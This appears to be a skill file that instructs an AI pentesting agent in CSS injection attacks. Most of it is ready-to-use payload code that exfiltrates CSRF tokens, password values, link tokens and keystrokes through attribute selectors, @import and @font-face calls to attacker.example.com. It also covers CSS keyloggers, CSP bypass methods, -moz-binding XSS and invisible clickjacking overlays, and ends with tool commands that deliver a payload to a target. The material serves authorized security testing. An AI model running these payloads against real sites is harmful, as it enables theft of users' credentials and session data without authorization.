---
name: css-injection
description: "CSS injection exploitation for data exfiltration via attribute selectors, keylogger injection, and UI redressing"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["css injection", "css data exfiltration", "attribute selector", "css keylogger", "exfil via css", "css injection attack", "blind css", "style injection", "css exfiltration"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1059.007"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
---

# CSS Injection

## When to Use

- Target accepts user-controlled CSS or style input (e.g., profile customization, theme settings, rich text editors).
- HTML attributes (`value`, `href`, `src`, `alt`, `title`) contain sensitive data (tokens, emails, names).
- CSP blocks JavaScript but allows external stylesheets or inline style loading.
- UI redressing / clickjacking via `position: fixed` overlays.
- Blind injection where only out-of-band callbacks (DNS/HTTP) are observable.

## When NOT to Use

- No user-controlled style or CSS input vector exists.
- Content Security Policy blocks external resource loads entirely (no `style-src`, no `img`).
- Target renders user input inside `<style>` tags but sanitizes or strips attribute selectors.
- Data to exfiltrate is not reflected in any renderable HTML attribute.

## Auth Context

CSS injection is most powerful when the attacker is authenticated and the target stores per-user style preferences or reflects attributes from authenticated pages. Authentication state determines which attributes (tokens, session IDs, profile fields) are present in the DOM and therefore exfiltratable.

---

## CSS Injection Basics

CSS injection occurs when user-controlled input is inserted into a `<style>` block, a `style` attribute, or an external stylesheet reference without proper sanitization. The fundamental primitive is:

```
USER_INPUT → rendered as CSS → triggers external resource loads → out-of-band data exfiltration
```

Common injection points:

- Profile fields rendered as inline styles: `<div style="USER_INPUT">`
- Theme customization stored and reflected in `<style>` blocks.
- Rich text editors that preserve `<style>` tags.
- URL parameters reflected into stylesheet `href` attributes.
- Markdown processors that allow raw HTML including `<style>`.

### Minimal Proof of Concept

```
background: url(https://attacker.example.com/callback?stolen=data)
```

If this renders and the server receives a request to `https://attacker.example.com/callback?stolen=data`, CSS injection is confirmed.

---

## Data Exfiltration via Attribute Selectors

CSS attribute selectors match HTML attribute values and can trigger resource loads conditionally. The `value` attribute of `<input>` fields, `href` on links, `src` on images, and `alt`/`title` on elements are all exfiltratable.

### Syntax

```css
input[value^="a"] { background: url(https://attacker.example.com/exfil?a); }
input[value^="b"] { background: url(https://attacker.example.com/exfil?b); }
input[value^="c"] { background: url(https://attacker.example.com/exfil?c); }
```

### Attribute Selectors

| Selector | Matches | Example |
|----------|---------|---------|
| `[attr^="val"]` | Starts with `val` | `[value^="admin"]` matches `value="admin123"` |
| `[attr$="val"]` | Ends with `val` | `[value$="@gmail.com"]` matches `value="user@gmail.com"` |
| `[attr*="val"]` | Contains `val` | `[value*="session"]` matches `value="abc-session-xyz"` |
| `[attr\|="val"]` | Exact or starts with `val-` | `[href\|="https://example.com"]` |
| `[attr~="val"]` | Space-separated word match | `[title~="token"]` |

### Practical Exfiltration Example

Target stores a CSRF token in a hidden input:

```html
<input type="hidden" name="csrf" value="a8f3k9x2">
```

Inject CSS to extract position 0:

```css
input[name="csrf"][value^="0"] { background: url(https://attacker.example.com/exfil?p0=c0); }
input[name="csrf"][value^="1"] { background: url(https://attacker.example.com/exfil?p0=c1); }
input[name="csrf"][value^="2"] { background: url(https://attacker.example.com/exfil?p0=c2); }
/* ... iterate through all possible characters ... */
input[name="csrf"][value^="a"] { background: url(https://attacker.example.com/exfil?p0=ca); }
```

---

## Character-by-Character Extraction

Extracting a full value requires iterating over each position. For a token of length N, generate N sets of rules, each set covering all possible characters for that position.

### Generation Template

```
POSITION = token length (estimate or iterate until stable)
CHARSET = [a-z, A-Z, 0-9, - _, . @ / + =] (common token characters)

For each position p (0 to POSITION-1):
  For each character c in CHARSET:
    Generate rule:
    input[value^="KNOWN_PREFIX + c"] { background: url(https://attacker.example.com/exfil?p={p}&c={c}); }
```

### Known Prefix Building

Once position 0 is confirmed (callback received for that character), the prefix grows:

```
Position 0: test "a", "b", ... → callback for "a" → prefix = "a"
Position 1: test "a0", "a1", ... → callback for "a8" → prefix = "a8"
Position 2: test "a80", "a81", ... → callback for "a8f" → prefix = "a8f"
```

### Optimization

- Use wildcard suffix to avoid needing exact length: `input[value^="a8f"]` matches regardless of remaining characters.
- Use `background-image` instead of `background` for better cross-browser support.
- Use `@font-face` + `font-family` for cleaner exfiltration (avoids image load timing issues).
- Batch character sets into fewer rules using `[value^="a"], [value^="b"], [value^="c"]` with comma-separated selectors when the server distinguishes via query parameter.

---

## CSS Keylogger

A CSS keylogger captures keystrokes by styling input elements based on `:focus` and pseudo-class states. The attacker cannot observe real-time keystrokes directly, but can exfiltrate data by triggering resource loads on specific CSS conditions.

### Focus-Based Keylogger

```css
input:focus {
  background: url(https://attacker.example.com/keylog?field=NAME&focused=true);
}
```

### Attribute-Based Keystroke Inference

When input fields have dynamic attributes that change with each keystroke (e.g., `aria-describedby`, `data-length`, custom attributes), attribute selectors can track changes:

```css
input[data-length="1"] { background: url(https://attacker.example.com/keylog?len=1); }
input[data-length="2"] { background: url(https://attacker.example.com/keylog?len=2); }
input[data-length="3"] { background: url(https://attacker.example.com/keylog?len=3); }
```

### Password Field Keylogger (Attribute Dependent)

If the password field reflects typed characters in a `value` attribute (e.g., auto-fill, some JS frameworks):

```css
input[type="password"][value^="a"] { background: url(https://attacker.example.com/pass?p0=a); }
input[type="password"][value^="b"] { background: url(https://attacker.example.com/pass?p0=b); }
/* ... */
```

### Practical Limitations

- CSS keyloggers require the attribute to update in the DOM with each keystroke — most standard `<input>` fields do NOT expose `value` via CSS attribute selectors in real-time.
- More reliable when combined with JavaScript that sets a data attribute on each keypress.
- `:focus` pseudo-class is the most reliable but only gives a single callback per focus event.

---

## Blind CSS Injection

When no direct rendering is visible, CSS injection can still exfiltrate data from HTML attributes via out-of-band callbacks.

### Exfiltrating from `href` Attributes

```css
a[href^="https://internal.corp/reset-password?token="] {
  background: url(https://attacker.example.com/exfil?token=ATTR);
}
```

### Exfiltrating from `src` Attributes

```css
img[src^="/avatar/"] {
  background: url(https://attacker.example.com/exfil?avatar=ATTR);
}
```

### Exfiltrating from `title` and `alt` Attributes

```css
div[title^="Welcome"] {
  background: url(https://attacker.example.com/exfil?title=ATTR);
}
```

### Exfiltrating via `@import`

```css
@import url("https://attacker.example.com/import?data=SENSITIVE_VALUE");
```

### Exfiltrating via `@font-face`

```css
@font-face {
  font-family: exfil;
  src: url("https://attacker.example.com/font?data=SENSITIVE_VALUE");
}
body { font-family: exfil; }
```

This is often more reliable than `background-image` because font loading is less likely to be blocked or cached.

---

## CSP Bypass

Content Security Policy may block inline scripts but CSS injection often operates under different CSP rules.

### Common CSP Bypass Scenarios

| CSP Directive | CSS Injection Impact |
|---------------|---------------------|
| `script-src 'self'` | No effect — CSS injection does not use `<script>` |
| `style-src 'self'` | Blocks external stylesheets but inline `style` attributes may still work |
| `style-src 'unsafe-inline'` | Allows `<style>` blocks — full CSS injection |
| `img-src 'self'` | Blocks `background-image` to external domains — use `@font-face` or `@import` |
| `connect-src 'self'` | Blocks XHR/fetch but does not affect CSS resource loads (`background`, `@import`) |
| No `style-src` directive | Default `script-src` applies to styles — may block inline |

### Bypass Techniques

1. **@import in external stylesheet**: If `style-src` allows external sheets, host CSS on attacker server that uses `@import` to load a second stylesheet containing exfiltration rules.

2. **@font-face bypass**: `font-src` is separate from `img-src`. If `font-src` is unrestricted, exfiltrate via font loading.

3. **CSS Variables via URL**: Some CSP implementations do not block `url()` in CSS custom properties.

4. **Behavior-dependent bypass**: If CSP only blocks certain domains, use a domain that is whitelisted (e.g., a CDN that allows arbitrary path parameters).

5. **Partial CSP**: If CSP only sets `script-src` but not `style-src`, the default falls back to `script-src` which may or may not apply to CSS depending on the browser.

---

## Mutation XSS via CSS

CSS can trigger DOM mutations that enable XSS when combined with certain HTML patterns.

### Technique

```css
@import url("https://attacker.example.com/style.css");
```

If the imported stylesheet contains:

```css
* {
  -moz-binding: url("https://attacker.example.com/xbl.xml#xss");
}
```

In older Firefox versions, this could trigger XBL (XML Binding Language) execution.

### Modern Mutation Vectors

1. **CSS `content` property injection**: If user-controlled CSS can set `content` on elements that are later processed by JavaScript, the injected content may be interpreted as HTML.

2. **CSS `display` toggling**: Hide security-critical elements (CSRF tokens, confirmation buttons) via `display: none`, then exfiltrate when the form auto-submits.

3. **CSS + JavaScript interaction**: If a page reads computed styles and uses them in DOM operations, injecting `expression()` (IE) or `-moz-binding` can lead to code execution.

### UI Redressing (Clickjacking via CSS)

```css
iframe {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 9999;
  opacity: 0;
}
```

Overlay an invisible iframe on top of a legitimate page element to trick users into clicking.

---

## Testing Methodology

### Step-by-Step

1. **Identify injection vector** — Find where user input is reflected in CSS context (inline `style`, `<style>` block, stylesheet `href`).

2. **Confirm renderability** — Inject a benign callback: `background: url(https://attacker.example.com/test?css=1)`. Verify the callback is received.

3. **Map target attributes** — Inspect the DOM for exfiltratable attributes: `value`, `href`, `src`, `alt`, `title`, `data-*` attributes. Identify which contain sensitive data.

4. **Generate exfiltration rules** — Create CSS rules targeting the identified attributes using attribute selectors. Use the character-by-character approach for full extraction.

5. **Deliver payload** — Inject via the identified vector. If stored injection (e.g., profile theme), the payload persists. If reflected, may need to craft a URL.

6. **Monitor callbacks** — Set up a listener (e.g., Burp Collaborator, interactsh, or a simple HTTP server) to capture incoming requests containing exfiltrated data.

7. **Iterate** — Build the extracted value character by character. Each confirmed callback narrows the prefix for the next position.

8. **Verify** — Once the full value is extracted, verify it works (e.g., use the extracted CSRF token in a request).

### Tool Commands

```
# Inject CSS via HTTP request and verify rendering
httpRequest --method POST --url "https://target.com/api/theme" --body '{"css": "background: url(https://collaborator.example.com/test)"}'

# Check if callback was received (check Collaborator/DNS logs)
getCapturedHeaders --filter "collaborator.example.com"

# Render page and inspect computed styles
evaluateRendered --expression "document.querySelectorAll('input[style]').length"

# Record evidence of successful injection
recordEvidence --type "css-injection" --detail "Callback received for background-image rule"

# Update graph with finding
updateGraph --nodeType Finding --data '{"type": "CSS Injection", "severity": "medium", "vector": "style attribute"}'

# Write formal finding
writeFinding --title "CSS Injection - Data Exfiltration via Attribute Selectors" --severity medium --detail "User-controlled CSS input allows attribute selector exfiltration of HTML attributes"
```

### Checklist

- [ ] User-controlled CSS input vector identified.
- [ ] Callback received confirming CSS renders.
- [ ] Exfiltratable HTML attributes mapped.
- [ ] Character-by-character extraction rules generated.
- [ ] Full sensitive value extracted via callbacks.
- [ ] CSP restrictions evaluated and bypasses identified.
- [ ] Finding documented with reproduction steps.

---

## Anti-Hallucination

**What must be verified by tool output, never assumed:**

- The callback URL was actually received — check DNS/HTTP logs, do not assume CSS rendered.
- The attribute selector matched — verify the callback parameter contains the expected character, not a false positive from caching or browser prefetch.
- The target attribute actually contains sensitive data — inspect the DOM via `evaluateRendered` or `parseResponse`, never guess attribute contents.
- CSP is not blocking the payload — if no callback received, check CSP headers via `getCapturedHeaders` before concluding injection failed.
- The CSS context is actually injectable — confirm the input is rendered inside a `<style>` tag or `style` attribute, not inside a JavaScript string or HTML entity-encoded context.

**What is tool-dependent:**

- Exfiltrated values — must come from actual callback parameters, never fabricated.
- CSP bypass success — must be confirmed by receiving callbacks, not by reading CSP headers alone (headers may differ from enforcement).
- Mutation XSS — requires actual DOM mutation observed via `evaluateRendered`, not theoretical possibility.
- CSS rendering — must be confirmed by callback, as browsers may strip or ignore malformed CSS.
